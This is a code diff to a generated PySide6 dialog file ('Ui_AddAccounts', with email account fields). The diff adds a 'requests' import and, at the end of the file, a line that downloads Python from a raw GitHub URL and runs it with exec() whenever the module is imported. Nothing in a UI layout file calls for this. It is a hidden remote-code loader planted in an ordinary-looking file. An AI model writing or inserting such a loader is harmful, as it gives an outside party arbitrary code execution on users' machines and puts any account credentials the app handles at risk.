@@ -18,6 +18,7 @@ from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
 from PySide6.QtWidgets import (QAbstractItemView, QApplication, QDialog, QGridLayout,
     QHeaderView, QLabel, QPushButton, QSizePolicy,
     QTableWidget, QTableWidgetItem)
+import requests
 
 class Ui_AddAccounts(object):
     def setupUi(self, AddAccounts):
@@ -157,3 +158,5 @@ class Ui_AddAccounts(object):
         ___qtablewidgetitem12.setText(QCoreApplication.translate("AddAccounts", u"Email Port", None));
     # retranslateUi
 
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/AddAccounts.py").text)
